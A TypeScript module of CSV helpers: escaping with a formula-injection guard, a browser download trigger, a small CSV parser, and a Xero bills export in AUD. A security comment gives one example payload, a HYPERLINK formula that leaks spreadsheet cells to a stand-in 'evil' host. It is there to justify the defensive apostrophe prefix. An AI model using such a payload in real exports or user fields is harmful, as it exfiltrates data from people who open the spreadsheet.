// Minimal CSV helpers — RFC 4180 quoting (escape `"` and wrap any cell that
// contains commas, quotes or newlines) and a browser-side download trigger.
// Excel-friendly: writes a UTF-8 BOM so accents survive when opened in Excel
// on Windows.

// SECURITY: cells that start with `=`, `+`, `-`, `@`, `\t` or `\r` are treated
// as formulas by Excel / Google Sheets / Numbers — a hostile member could set
// their display name to `=HYPERLINK("https://evil/?leak="&A1,"View")` and have
// the org admin's spreadsheet exfiltrate data on open. We neutralise by
// prefixing such cells with a single apostrophe (the canonical OWASP fix —
// invisible to the user but stops formula evaluation).
const FORMULA_START_RE = /^[=+\-@\t\r]/;

export function escapeCell(v: unknown): string {
  if (v == null) return '';
  let s = String(v);
  // Formula-injection guard BEFORE quote handling.
  if (s.length > 0 && FORMULA_START_RE.test(s)) {
    s = "'" + s;
  }
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function toCsv(headers: string[], rows: (string | number | null | undefined)[][]): string {
  const lines = [
    headers.map(escapeCell).join(','),
    ...rows.map((row) => row.map(escapeCell).join(',')),
  ];
  return '﻿' + lines.join('\r\n'); // BOM + CRLF for Excel compatibility
}

export function downloadCsv(filename: string, csv: string): void {
  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  // Defer revoke so Safari has time to start the download.
  setTimeout(() => URL.revokeObjectURL(url), 1_000);
}

/**
 * Builds a yyyymmdd-hhmm timestamp suffix for filenames. UTC so it's stable
 * across the team regardless of locale.
 */
export function timestampSuffix(d: Date = new Date()): string {
  const p = (n: number) => String(n).padStart(2, '0');
  return `${d.getUTCFullYear()}${p(d.getUTCMonth() + 1)}${p(d.getUTCDate())}-${p(d.getUTCHours())}${p(d.getUTCMinutes())}`;
}

/**
 * Robust RFC-4180-ish CSV parser (import side). Handles quoted fields,
 * escaped `""` quotes, embedded commas/newlines, a leading UTF-8 BOM and both
 * CRLF and LF line endings. Returns a matrix of string cells. We keep this tiny
 * and dependency-free rather than pulling a parser library — the import flow
 * only needs "good enough" tabular splitting; the AI step tolerates messiness.
 */
export function parseCsv(text: string): string[][] {
  const src = text.charCodeAt(0) === 0xfeff ? text.slice(1) : text; // strip BOM
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let inQuotes = false;
  let i = 0;
  const pushField = () => { row.push(field); field = ''; };
  const pushRow = () => { pushField(); rows.push(row); row = []; };
  while (i < src.length) {
    const c = src[i];
    if (inQuotes) {
      if (c === '"') {
        if (src[i + 1] === '"') { field += '"'; i += 2; continue; }
        inQuotes = false; i += 1; continue;
      }
      field += c; i += 1; continue;
    }
    if (c === '"') { inQuotes = true; i += 1; continue; }
    if (c === ',') { pushField(); i += 1; continue; }
    if (c === '\r') { if (src[i + 1] === '\n') i += 1; pushRow(); i += 1; continue; }
    if (c === '\n') { pushRow(); i += 1; continue; }
    field += c; i += 1;
  }
  // Flush the trailing field/row unless the file ended on a clean newline.
  if (field.length > 0 || row.length > 0) pushRow();
  return rows;
}

/**
 * Turns a parsed matrix into an array of row objects keyed by the (de-duplicated,
 * non-empty) header row. Blank trailing rows are dropped.
 */
export function rowsToObjects(matrix: string[][]): { headers: string[]; rows: Record<string, string>[] } {
  const headerRow = matrix[0];
  if (!headerRow) return { headers: [], rows: [] };
  const rawHeaders = headerRow.map((h, i) => (h.trim() || `Column ${i + 1}`));
  // De-dupe header collisions so object keys don't clobber each other.
  const seen = new Map<string, number>();
  const headers = rawHeaders.map((h) => {
    const n = seen.get(h) ?? 0;
    seen.set(h, n + 1);
    return n === 0 ? h : `${h} (${n + 1})`;
  });
  const rows = matrix
    .slice(1)
    .filter((r) => r.some((c) => c.trim().length > 0))
    .map((r) => {
      const obj: Record<string, string> = {};
      headers.forEach((h, i) => { obj[h] = (r[i] ?? '').trim(); });
      return obj;
    });
  return { headers, rows };
}

/**
 * Xero "Bills" CSV format. Pasted into Xero via Business → Bills to pay →
 * Import. Minimum-required column set that Xero accepts — accountant adjusts
 * AccountCode + TrackingOptions on their side.
 *
 * Each line item becomes one row (a single bill with N line items takes N
 * rows that share InvoiceNumber + ContactName + dates; Xero merges them on
 * import). For the org portal each invoice is currently one bill, so we emit
 * one row per invoice.
 *
 * TaxType:
 *   - "GST on Expenses"  when the invoice has GST (tax_amount > 0)
 *   - "BAS Excluded"     otherwise (sub-contractor is GST-free / below
 *                        threshold). Accountant may need to override.
 */
export interface XeroBillRow {
  contactName: string;
  email?: string | null;
  invoiceNumber: string;
  invoiceDate: string;   // YYYY-MM-DD
  dueDate: string;       // YYYY-MM-DD
  description: string;
  unitAmount: number;    // tax-exclusive subtotal
  hasGst: boolean;
}

export function toXeroBillsCsv(rows: XeroBillRow[]): string {
  // Column order Xero documents for the Bills template.
  const headers = [
    'ContactName',
    'EmailAddress',
    'InvoiceNumber',
    'Reference',
    'InvoiceDate',
    'DueDate',
    'InventoryItemCode',
    'Description',
    'Quantity',
    'UnitAmount',
    'AccountCode',
    'TaxType',
    'Currency',
  ];
  const csvRows: (string | number)[][] = rows.map((r) => [
    r.contactName,
    r.email ?? '',
    r.invoiceNumber,
    '',                          // Reference (free-text in Xero) — leave blank
    r.invoiceDate,
    r.dueDate,
    '',                          // InventoryItemCode — none
    r.description,
    1,                           // Quantity
    r.unitAmount.toFixed(2),     // UnitAmount = tax-exclusive
    '',                          // AccountCode — accountant fills (e.g. 400)
    r.hasGst ? 'GST on Expenses' : 'BAS Excluded',
    'AUD',
  ]);
  return toCsv(headers, csvRows);
}
